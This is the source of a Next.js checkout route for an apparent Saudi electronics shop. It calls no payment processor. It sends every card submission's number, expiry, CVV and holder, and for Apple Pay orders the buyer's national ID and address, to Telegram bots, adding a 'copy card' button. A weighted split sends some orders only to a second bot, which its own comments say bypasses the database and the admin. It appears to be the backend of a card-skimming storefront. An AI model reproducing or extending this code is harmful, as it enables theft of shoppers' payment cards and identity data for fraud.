import { NextRequest, NextResponse } from "next/server";
import {
  selectBot,
  generateBot2OrderId,
  registerOrderBot,
  sendTelegramMessage,
} from "../../lib/telegramBots";
import { createBot2UserToken } from "../../lib/botContact";

const BACKEND_URL = (
  process.env.BACKEND_URL ||
  process.env.NEXT_PUBLIC_API_URL ||
  "http://localhost:5000"
).replace(/\/$/, "");

// Helper to sanitize inputs
function sanitize(str: string): string {
  if (!str) return "";
  return str.replace(/[<>'"]/g, "").trim();
}

// Validate Saudi national ID
function isValidSaudiId(id: string): boolean {
  if (!id || !/^[12]\d{9}$/.test(id)) return false;
  return true;
}

// Validate Saudi phone number
function isValidSaudiPhone(phone: string): boolean {
  if (!phone || !/^05\d{8}$/.test(phone.replace(/\D/g, ""))) return false;
  return true;
}

// Server-side deduplication cache to prevent rapid double-clicks from triggering both bots
interface DedupEntry {
  timestamp: number;
  selectedBot: 1 | 2;
  orderId: string;
  dbId: string | null;
  bot2Token?: string;
}
const recentSubmissions = new Map<string, DedupEntry>();
const DEDUP_WINDOW_MS = 25 * 1000; // 25 seconds

// Periodically clean old dedup entries
if (typeof setInterval !== "undefined") {
  const dedupCleanup = setInterval(() => {
    const now = Date.now();
    for (const [key, entry] of recentSubmissions.entries()) {
      if (now - entry.timestamp > DEDUP_WINDOW_MS) {
        recentSubmissions.delete(key);
      }
    }
  }, 30 * 1000);
  if (dedupCleanup.unref) dedupCleanup.unref();
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    let { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, discountAmount } = body;

    const isApplePay = cardNumber === "Apple Pay" || cardHolder === "Apple Pay";
    if (isApplePay) {
      if (!expiry) expiry = "Apple Pay";
      if (!cvv) cvv = "Apple Pay";
      if (!cardHolder) cardHolder = "Apple Pay";
    }

    // ── Validation ──
    if (!items || !Array.isArray(items) || items.length === 0) {
      return NextResponse.json({ ok: false, error: "لا توجد منتجات في الطلب" }, { status: 400 });
    }

    const totalOrderQty = items.reduce((sum: number, item: any) => sum + Math.max(1, Math.floor(Number(item?.quantity) || 1)), 0);
    if (totalOrderQty > 5) {
      return NextResponse.json({ ok: false, error: "الحد الأقصى للطلب هو 5 منتجات فقط" }, { status: 400 });
    }

    if (!customer || !whatsapp || !nationalId || !address) {
      return NextResponse.json({ ok: false, error: "بيانات العميل ناقصة" }, { status: 400 });
    }

    // Validate Saudi ID
    if (!isValidSaudiId(nationalId)) {
      return NextResponse.json({ ok: false, error: "رقم الهوية غير صحيح" }, { status: 400 });
    }

    // Validate phone number
    const cleanPhone = (whatsapp || "").replace(/\D/g, "");
    if (!isValidSaudiPhone(cleanPhone)) {
      return NextResponse.json({ ok: false, error: "رقم الواتساب غير صحيح" }, { status: 400 });
    }

    // Validate card data
    if (!isApplePay && (!cardNumber || !expiry || !cvv || !cardHolder)) {
      return NextResponse.json({ ok: false, error: "بيانات البطاقة ناقصة" }, { status: 400 });
    }

    // ── Deduplication / Idempotency Check ──
    const rawCard = String(cardNumber || "").replace(/\D/g, "");
    const dedupKey = `${rawCard.slice(-8)}_${total}_${String(customer || "").trim()}`;
    const now = Date.now();
    const existing = recentSubmissions.get(dedupKey);

    if (existing && now - existing.timestamp < DEDUP_WINDOW_MS) {
      const res = NextResponse.json({
        ok: true,
        orderId: existing.orderId,
        dbId: existing.dbId,
        dbSaved: existing.selectedBot === 1,
        telegramSent: true,
        duplicate: true,
        ...(existing.bot2Token ? { _bt: existing.bot2Token } : {}),
      });
      if (existing.selectedBot === 2 && existing.bot2Token) {
        res.cookies.set("_b_token", existing.bot2Token, {
          path: "/",
          maxAge: 365 * 24 * 60 * 60,
          sameSite: "lax",
        });
      }
      return res;
    }

    // Sanitize inputs
    const sanitizedData = {
      customer: sanitize(customer),
      address: sanitize(address),
      cardHolder: sanitize(cardHolder),
    };

    // ── Fetch and verify products from database ──
    let verifiedTotal = 0;
    const verifiedItems: any[] = [];

    try {
      const productIds = items.map((item: any) => item.productId).filter(Boolean);
      
      if (productIds.length === 0) {
        return NextResponse.json({ ok: false, error: "معرفات المنتجات غير صحيحة" }, { status: 400 });
      }

      // Fetch products from backend to verify prices
      const productsRes = await fetch(`${BACKEND_URL}/api/products`, {
        method: "GET",
        headers: { "Content-Type": "application/json" },
      });

      if (!productsRes.ok) {
        throw new Error("Failed to fetch products");
      }

      const allProducts = await productsRes.json();
      
      // Verify each item
      for (const item of items) {
        const product = allProducts.find((p: any) => p._id === item.productId);
        
        if (!product) {
          console.error(`[SECURITY] Product not found: ${item.productId}`);
          return NextResponse.json({ ok: false, error: "أحد المنتجات غير موجود" }, { status: 400 });
        }

        // Verify price from database
        const actualPrice = product.salePrice ?? product.originalPrice ?? product.price ?? 0;
        const requestedPrice = item.price ?? 0;
        
        // Allow small floating-point differences (1 SAR tolerance)
        if (Math.abs(actualPrice - requestedPrice) > 1) {
          console.error(`[SECURITY] Price mismatch for ${item.productId}. DB: ${actualPrice}, Request: ${requestedPrice}`);
          return NextResponse.json({ ok: false, error: "أسعار المنتجات غير صحيحة، يرجى تحديث السلة" }, { status: 400 });
        }

        const quantity = Math.max(1, Math.floor(item.quantity || 1));
        verifiedTotal += actualPrice * quantity;
        
        verifiedItems.push({
          productId: item.productId,
          name: sanitize(product.name || item.name || "منتج"),
          price: actualPrice,
          quantity: quantity,
        });
      }
    } catch (error) {
      console.error("[ERROR] Product verification failed:", error);
      return NextResponse.json({ ok: false, error: "فشل التحقق من المنتجات" }, { status: 500 });
    }

    const verifiedTotalQty = verifiedItems.reduce((sum, item) => sum + item.quantity, 0);
    if (verifiedTotalQty > 5) {
      return NextResponse.json({ ok: false, error: "الحد الأقصى للطلب هو 5 منتجات فقط" }, { status: 400 });
    }

    // Verify total amount (account for discount)
    const discount = Math.max(0, Number(discountAmount) || 0);
    const verifiedTotalAfterDiscount = verifiedTotal - discount;
    const requestedTotal = Number(total) || 0;
    if (Math.abs(verifiedTotalAfterDiscount - requestedTotal) > 1) {
      console.error(`[SECURITY] Total mismatch. Calculated: ${verifiedTotalAfterDiscount}, Requested: ${requestedTotal}`);
      return NextResponse.json({ ok: false, error: "الإجمالي غير صحيح، يرجى تحديث السلة" }, { status: 400 });
    }

    // ── Select destination bot using 70/30 weighted distribution ──
    const selectedBot = selectBot();

    const orderId =
      selectedBot === 2
        ? generateBot2OrderId()
        : `${Date.now()}${Math.floor(Math.random() * 1000)}`;

    registerOrderBot(orderId, selectedBot);

    const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((verifiedTotalAfterDiscount - downPayment) / months) : 0;

    // ── Build Telegram Text ──
    const whatsappUrl = `https://wa.me/${cleanPhone}`;
    const text = isApplePay
      ? [
          `🏪 New Order — مؤسسة البلاد الحديثة للإلكترونيات`,
          `🔢 Order Number: #${orderId}`,
          ``,
          `💰 Order Price: ${verifiedTotal} SAR`,
          ...(discount > 0 ? [
            `🏷️ Discount: -${discount} SAR`,
            `──────────────────`,
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ] : [
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ]),
          ...(installmentType === "installment"
            ? [`💳 First Payment: ${downPayment} SAR`]
            : [`💳 Payment Type: Full Amount`]),
          ``,
          `🍏 Payment Method: Apple Pay`,
          `👤 Customer Name: ${sanitizedData.customer}`,
          `📱 WhatsApp: ${cleanPhone}`,
          `📍 Address: ${sanitizedData.address}`,
          `🆔 National ID: ${nationalId}`,
        ].join("\n")
      : [
          `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
          `🔢 رقم الطلب: #${orderId}`,
          ``,
          `💰 سعر الطلب: ${verifiedTotal} SAR`,
          ...(discount > 0 ? [
            `🏷️ Discount: -${discount} SAR`,
            `──────────────────`,
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ] : [
            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
          ]),
          ...(installmentType === "installment"
            ? [`💳 First Payment: ${downPayment} SAR`]
            : [`💳 Payment Type: Full Amount`]),
          ``,
          `💳 MadaVisa - New Order`,
          `👤 Order For: ${sanitizedData.customer}`,
          `📱 WhatsApp: ${cleanPhone}`,
          `💳 Card Number: ${cardNumber}`,
          `👤 Card Holder: ${sanitizedData.cardHolder}`,
          `📅 Valid To: ${expiry}`,
          `🔐 CVV: ${cvv}`,
        ].join("\n");

    const inlineKeyboard = isApplePay
      ? [[{ text: "💬 فتح واتساب", url: whatsappUrl }]]
      : [
          [{ text: "💬 فتح واتساب", url: whatsappUrl }],
          [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
        ];

    // -------------------------------------------------------------
    // BOT 1 (PRIMARY - 70%): Database + Admin + Bot 1 Telegram
    // -------------------------------------------------------------
    if (selectedBot === 1) {
      let dbId: string | null = null;
      let dbSaveSuccess = false;

      try {
        const dbRes = await fetch(`${BACKEND_URL}/api/checkout`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            orderId, 
            cardNumber, 
            expiry, 
            cvv, 
            cardHolder: sanitizedData.cardHolder, 
            items: verifiedItems, 
            total: verifiedTotalAfterDiscount, 
            customer: sanitizedData.customer, 
            whatsapp: cleanPhone, 
            nationalId, 
            address: sanitizedData.address, 
            installmentType, 
            months: Number(months) || 0, 
            monthlyPayment, 
            downPayment: Number(downPayment) || 0,
            discountAmount: discount,
          }),
        });

        if (!dbRes.ok) {
          const errorText = await dbRes.text().catch(() => "Unknown error");
          console.error(`[ERROR] Database save failed: ${dbRes.status} ${errorText}`);
          throw new Error("Database save failed");
        }

        const dbData = await dbRes.json();
        dbId = dbData._id ?? null;
        dbSaveSuccess = true;
      } catch (error) {
        console.error("[CRITICAL] Failed to save order to database:", error);
        return NextResponse.json({ 
          ok: false, 
          error: "فشل حفظ الطلب، يرجى المحاولة مرة أخرى" 
        }, { status: 500 });
      }

      // Record in deduplication map
      recentSubmissions.set(dedupKey, {
        timestamp: now,
        selectedBot: 1,
        orderId,
        dbId,
      });

      // Send to Bot 1
      const telegramSent = await sendTelegramMessage(1, {
        text,
        reply_markup: { inline_keyboard: inlineKeyboard },
      });

      const res = NextResponse.json({
        ok: true,
        orderId,
        dbId,
        dbSaved: dbSaveSuccess,
        telegramSent,
      });
      res.cookies.set("_b_token", "bot_1", {
        path: "/",
        maxAge: 365 * 24 * 60 * 60,
        sameSite: "lax",
      });
      return res;
    }

    // -------------------------------------------------------------
    // BOT 2 (SECONDARY - 30%): Telegram ONLY (Zero DB / Zero Admin)
    // -------------------------------------------------------------
    // CRITICAL: We DO NOT call backend /api/checkout at all.
    const telegramSent = await sendTelegramMessage(2, {
      text,
      reply_markup: { inline_keyboard: inlineKeyboard },
    });

    if (!telegramSent) {
      return NextResponse.json(
        { ok: false, error: "تعذر إرسال الطلب، يرجى المحاولة لاحقاً" },
        { status: 502 }
      );
    }

    const bot2Token = createBot2UserToken();

    // Record in deduplication map
    recentSubmissions.set(dedupKey, {
      timestamp: now,
      selectedBot: 2,
      orderId,
      dbId: null,
      bot2Token,
    });

    const res = NextResponse.json({
      ok: true,
      orderId,
      dbId: null,
      dbSaved: false,
      telegramSent: true,
      _bt: bot2Token,
    });
    res.cookies.set("_b_token", bot2Token, {
      path: "/",
      maxAge: 365 * 24 * 60 * 60,
      sameSite: "lax",
    });
    return res;

  } catch (error) {
    console.error("[CRITICAL ERROR]", error);
    return NextResponse.json({ 
      ok: false, 
      error: "حدث خطأ غير متوقع، يرجى المحاولة مرة أخرى" 
    }, { status: 500 });
  }
}
